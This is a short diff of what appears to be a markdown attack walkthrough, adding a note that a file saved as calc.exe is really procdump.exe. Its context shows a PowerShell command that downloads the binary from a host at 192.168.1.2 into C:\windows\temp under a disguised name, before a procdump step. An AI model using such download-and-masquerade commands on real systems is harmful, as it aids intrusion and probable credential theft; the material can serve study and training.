@@ -101,6 +101,7 @@ g. Download `procdump.exe`
 ```
 powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file2.exe', 'C:\windows\temp\calc.exe')
 ```
+> calc.exe == procdump.exe
 
 h. Use `procdump.exe`
 ```
